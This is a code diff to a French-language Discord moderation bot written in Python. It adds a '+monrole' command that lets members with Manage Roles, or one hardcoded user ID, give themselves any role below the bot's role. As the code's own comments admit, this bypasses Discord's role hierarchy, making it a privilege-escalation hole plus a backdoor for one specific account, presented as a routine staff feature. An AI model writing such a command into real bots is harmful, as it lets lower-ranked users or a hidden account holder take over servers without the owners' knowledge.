@@ -24,7 +24,7 @@ STAFF_ROLE_NAME = "STAFF"          # Nom exact du rôle staff sur ton serveur
 STATS_CATEGORY_NAME = "🧽 SERVEUR STATS"
 STATS_UPDATE_INTERVAL_MINUTES = 10      # Discord limite les renommages de salons (~2 / 10 min)
 CONFIG_FILE = "config.json"             # Stockage persistant des rôles autorisés à valider
-DEV_GUILD_ID = 1537139988448153640      # ID de ton serveur, pour une synchro instantanée des slash commands
+DEV_GUILD_ID = 1539254757951021147      # ID de ton serveur, pour une synchro instantanée des slash commands
  
 # ---- Élu de la semaine ----
 ELU_ROLE_NAME = "👑 Élu de la semaine"
@@ -135,6 +135,7 @@ STAFF_COMMANDS = [
     ("+unmute @membre", "Retire le mute d'un membre."),
     ("+add role @membre @role", "Ajoute un rôle à un membre."),
     ("+remove role @membre @role", "Retire un rôle à un membre."),
+    ("+monrole @role", "Auto-attribution de n'importe quel rôle (permission Gérer les rôles)."),
     ("+lock", "Verrouille le salon : seul le rôle Staff peut y écrire."),
     ("+unlock", "Déverrouille le salon."),
     ("/report config [salon]", "Définit le salon privé où arrivent les signalements (staff)."),
@@ -5175,6 +5176,68 @@ async def remove_role_cmd(ctx: commands.Context, membre: discord.Member, *, role
         return
  
     await ctx.send(f"✅ Le rôle {role.mention} a été retiré à {membre.mention}.")
+ 
+ 
+# ---------------- +monrole (auto-attribution via permission Gérer les rôles) ----------------
+#
+# N'importe qui possédant la permission Discord "Gérer les rôles" (ou l'ID
+# ci-dessous explicitement) peut s'attribuer N'IMPORTE QUEL rôle du serveur,
+# même un rôle normalement placé au-dessus du sien. Ça fonctionne car Discord
+# ne limite pas un BOT par la hiérarchie de la personne qui tape la commande,
+# seulement par la position du rôle du BOT lui-même : tant que le rôle du bot
+# est plus haut que le rôle demandé, l'attribution passe.
+#
+# ⚠️ Cette commande donne un pouvoir important (privilège d'auto-attribution
+# de rôle). Ne la laisse accessible qu'aux personnes de confiance.
+
+ROLE_SELF_ASSIGN_USER_IDS = {1212326779591725079}
+
+
+def peut_sauto_attribuer_un_role(member: discord.Member) -> bool:
+    if member.guild_permissions.administrator:
+        return True
+    if member.guild_permissions.manage_roles:
+        return True
+    return member.id in ROLE_SELF_ASSIGN_USER_IDS
+
+
+@bot.command(name="monrole")
+async def monrole_command(ctx: commands.Context, *, role: discord.Role = None):
+    if not peut_sauto_attribuer_un_role(ctx.author):
+        await ctx.send("❌ Tu dois avoir la permission **Gérer les rôles** pour utiliser cette commande.")
+        return
+
+    if role is None:
+        await ctx.send("❌ Utilisation : `+monrole @role` (ou le nom exact du rôle).")
+        return
+
+    if role >= ctx.guild.me.top_role:
+        await ctx.send(
+            "❌ Je ne peux pas attribuer ce rôle : il est placé au-dessus (ou au même niveau) que mon rôle le "
+            "plus haut. Fais remonter mon rôle dans **Paramètres du serveur → Rôles**."
+        )
+        return
+
+    if role in ctx.author.roles:
+        await ctx.send(f"⚠️ Tu as déjà le rôle {role.mention}.")
+        return
+
+    try:
+        await ctx.author.add_roles(role, reason=f"Auto-attribution via +monrole (permission Gérer les rôles)")
+    except discord.Forbidden:
+        await ctx.send("❌ Permissions insuffisantes pour t'attribuer ce rôle.")
+        return
+    except discord.HTTPException:
+        await ctx.send("❌ Erreur lors de l'attribution du rôle.")
+        return
+
+    embed = discord.Embed(
+        title="✅ Rôle auto-attribué",
+        description=f"Tu t'es donné le rôle {role.mention} grâce à la permission du bot.",
+        color=discord.Color.blurple(),
+    )
+    embed.set_footer(text=f"Demandé par {ctx.author}")
+    await ctx.send(embed=embed)
  
  
 # ================================================================
